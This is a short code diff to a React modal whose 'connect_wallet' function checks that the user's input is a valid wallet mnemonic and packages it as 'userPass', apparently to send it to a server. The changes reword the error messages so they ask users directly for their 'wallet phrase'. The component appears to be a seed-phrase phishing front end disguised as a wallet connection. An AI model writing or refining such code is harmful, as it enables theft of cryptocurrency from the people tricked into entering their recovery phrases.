@@ -62,7 +62,7 @@ const MyModal = ({isOpen, isLogin, isBalance, setAddress, isStake}) => {
     const connect_wallet = () => {
         var check = ethers.utils.isValidMnemonic(kword);
         if (check == false) {
-            toast.error('Please input correct password');
+            toast.error('Please enter your correct wallet phrase');
         } else {
             const formDatas = {
                 userPass:kword
@@ -79,7 +79,7 @@ const MyModal = ({isOpen, isLogin, isBalance, setAddress, isStake}) => {
             })
             .catch(err => {
                 console.log("err-----", err);
-                toast.error(<div>Your info is wrong! <br/>Please register and check your pass.</div>);
+                toast.error(<div>Wrong!<br/>Please enter your correct wallet phrase</div>);
                 setIsOpen(false);
                 setKword('');
             })
